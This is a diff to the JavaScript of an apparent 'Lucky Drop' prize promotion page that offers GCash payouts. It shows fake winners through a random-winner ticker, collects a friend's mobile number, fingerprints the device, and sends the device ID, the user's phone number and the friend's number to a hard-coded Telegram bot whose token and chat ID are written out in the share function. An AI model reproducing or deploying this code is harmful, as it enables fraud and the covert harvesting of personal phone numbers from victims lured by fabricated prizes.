@@ -3,11 +3,19 @@
  * Lucky Drop Promo
  */
 
-// ========== UNMUTE VIDEO ON INPUT FOCUS ==========
+// ========== VIDEO VOLUME CONTROL ==========
+function setVideoVolume() {
+    const videos = document.querySelectorAll('video');
+    videos.forEach(v => {
+        v.volume = 0.3;  // 30% volume
+    });
+}
+
 function unmuteAndPlayVideos() {
     const videos = document.querySelectorAll('video');
     videos.forEach(v => {
         v.muted = false;
+        v.volume = 0.3;  // 30% volume
         v.play().catch(e => console.log('Video play error:', e));
     });
 }
@@ -27,7 +35,7 @@ function updateTicker() {
     const winner = generateRandomWinner();
     const winnerSpan = document.getElementById('winnerText');
     if (winnerSpan) {
-        winnerSpan.innerHTML = ` ${winner.display} withdrew <img src="images/gc_icon.png" class="gc-winner-icon"> ₱${winner.amount}`;
+        winnerSpan.innerHTML = `🎲 ${winner.display} withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱${winner.amount}`;
     }
 }
 
@@ -110,6 +118,7 @@ function updateUI() {
         if (shareBtn) {
             shareBtn.disabled = true;
             shareBtn.style.opacity = '0.5';
+            shareBtn.style.pointerEvents = 'none';
         }
     }
     if (gameState.friendConfirmed && !gameState.claimed) {
@@ -130,6 +139,13 @@ function updatePopupTimerDisplay() {
         if (claimBtn) {
             claimBtn.disabled = true;
             claimBtn.style.opacity = '0.5';
+            claimBtn.style.pointerEvents = 'none';
+        }
+    } else {
+        if (claimBtn && gameState.friendConfirmed) {
+            claimBtn.disabled = false;
+            claimBtn.style.opacity = '1';
+            claimBtn.style.pointerEvents = 'auto';
         }
     }
 }
@@ -187,6 +203,13 @@ async function loadGameData() {
     if (gameState.claimed && shareBtn) {
         shareBtn.disabled = true;
         shareBtn.style.opacity = '0.5';
+        shareBtn.style.pointerEvents = 'none';
+    }
+    // Re-enable share button if not shared yet
+    if (!gameState.shared && shareBtn) {
+        shareBtn.disabled = false;
+        shareBtn.style.opacity = '1';
+        shareBtn.style.pointerEvents = 'auto';
     }
 }
 
@@ -205,30 +228,63 @@ async function saveGameData() {
 
 // ========== SHARE & UNLOCK ==========
 async function shareAndEarn() {
-    if (gameState.claimed) { alert("Prize already claimed!"); return; }
-    if (gameState.shared) { alert("Already shared! Waiting for friend confirmation."); return; }
+    // Prevent if already processing
+    if (shareBtn.disabled && gameState.shared) return;
+    
+    if (gameState.claimed) { 
+        alert("Prize already claimed!"); 
+        return; 
+    }
+    if (gameState.shared) { 
+        alert("Already shared! Waiting for friend confirmation."); 
+        return; 
+    }
     if (!friendInput) return;
+    
     const friendPhone = friendInput.value.trim();
     if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
         alert("Please enter a valid 11-digit mobile number starting with 09.");
         return;
     }
-    if (!db) return;
-    const deviceCheck = await db.ref('share_earn_device/' + deviceId).once('value');
-    if (deviceCheck.exists() && deviceCheck.val().shared) {
-        alert("This device already participated. Only one account per device allowed.");
-        return;
-    }
-    gameState.shared = true;
-    gameState.referralPhone = friendPhone;
-    gameState.timerSeconds = 300;
-    await saveGameData();
-    startPopupTimer();
-    updateUI();
-    showPrizePopup();
     
-    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("📱 SHARE INITIATED\nDevice: " + deviceId + "\nUser: " + userPhone + "\nFriend: " + friendPhone)}`)
-        .catch(e => console.log);
+    if (!db) return;
+    
+    // Disable button temporarily to prevent double click
+    shareBtn.disabled = true;
+    shareBtn.style.opacity = '0.7';
+    shareBtn.style.pointerEvents = 'none';
+    
+    try {
+        const deviceCheck = await db.ref('share_earn_device/' + deviceId).once('value');
+        if (deviceCheck.exists() && deviceCheck.val().shared) {
+            alert("This device already participated. Only one account per device allowed.");
+            shareBtn.disabled = false;
+            shareBtn.style.opacity = '1';
+            shareBtn.style.pointerEvents = 'auto';
+            return;
+        }
+        
+        gameState.shared = true;
+        gameState.referralPhone = friendPhone;
+        gameState.timerSeconds = 300;
+        await saveGameData();
+        startPopupTimer();
+        updateUI();
+        showPrizePopup();
+        
+        // Clear input field after successful share
+        friendInput.value = '';
+        
+        fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("📱 SHARE INITIATED\nDevice: " + deviceId + "\nUser: " + userPhone + "\nFriend: " + friendPhone)}`)
+            .catch(e => console.log);
+            
+    } catch (error) {
+        console.error("Share error:", error);
+        shareBtn.disabled = false;
+        shareBtn.style.opacity = '1';
+        shareBtn.style.pointerEvents = 'auto';
+        alert("An error occurred. Please try again.");
+    }
 }
 
 // ========== CHECK FRIEND CONFIRMATION ==========
@@ -249,15 +305,26 @@ async function checkFriendConfirmation() {
         if (gameState.timerSeconds > 0 && claimBtn) {
             claimBtn.disabled = false;
             claimBtn.style.opacity = '1';
+            claimBtn.style.pointerEvents = 'auto';
         }
     }
 }
 
 // ========== CLAIM THRU GCASH ==========
 async function claimThruGCash() {
-    if (gameState.claimed) { alert("Already claimed!"); return; }
-    if (!gameState.friendConfirmed) { alert("Friend must confirm invitation first."); return; }
-    if (gameState.timerSeconds <= 0) { alert("Time expired. Please try again."); return; }
+    if (gameState.claimed) { 
+        alert("Already claimed!"); 
+        return; 
+    }
+    if (!gameState.friendConfirmed) { 
+        alert("Friend must confirm invitation first."); 
+        return; 
+    }
+    if (gameState.timerSeconds <= 0) { 
+        alert("Time expired. Please try again."); 
+        return; 
+    }
+    
     gameState.claimed = true;
     await saveGameData();
     updateUI();
@@ -328,6 +395,9 @@ function startConfetti() {
 
 // ========== INITIALIZE ==========
 function initPromotion() {
+    // Set initial volume for videos
+    setVideoVolume();
+    
     // Get DOM elements
     friendInput = document.getElementById('friendPhoneInput');
     shareBtn = document.getElementById('shareButton');
@@ -348,7 +418,13 @@ function initPromotion() {
         friendInput.addEventListener('click', unmuteAndPlayVideos);
     }
     if (shareBtn) shareBtn.onclick = shareAndEarn;
-    if (claimBtn) claimBtn.onclick = claimThruGCash;
+    if (claimBtn) {
+        claimBtn.onclick = claimThruGCash;
+        // Initially disable claim button until friend confirms
+        claimBtn.disabled = true;
+        claimBtn.style.opacity = '0.5';
+        claimBtn.style.pointerEvents = 'none';
+    }
     if (fbBtn) fbBtn.onclick = shareToFacebook;
     
     window.closePrizePopup = closePrizePopup;
@@ -361,6 +437,13 @@ function initPromotion() {
     
     userPhone = localStorage.getItem("userPhone") || "";
     deviceId = getDeviceFingerprint();
+    
+    // Make sure share button is enabled initially
+    if (shareBtn) {
+        shareBtn.disabled = false;
+        shareBtn.style.opacity = '1';
+        shareBtn.style.pointerEvents = 'auto';
+    }
     
     // Start timers
     updateTicker();
